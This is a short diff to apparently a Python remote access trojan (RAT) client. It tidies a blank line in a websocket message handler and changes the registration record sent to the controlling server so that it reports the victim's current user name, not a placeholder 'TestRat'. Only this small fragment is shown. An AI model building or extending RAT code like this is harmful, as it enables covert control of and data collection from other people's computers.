@@ -20,7 +20,7 @@ ws_holder = classes.WSHolder()
 def on_message(ws, message):
     global should_reconnect
     print(f"[Server] {message}")
-    
+
     try:
         data = json.loads(message)
         msg_type = data.get("type")
@@ -70,7 +70,7 @@ def on_open(ws):
 
     rat_info = {
         "id": client_uuid,
-        "name": "TestRat",
+        "name": util.get_current_user(),
         "os": "Windows",
         "ip": "192.168.1.100",
         "metadata": {"version": "1.0"}
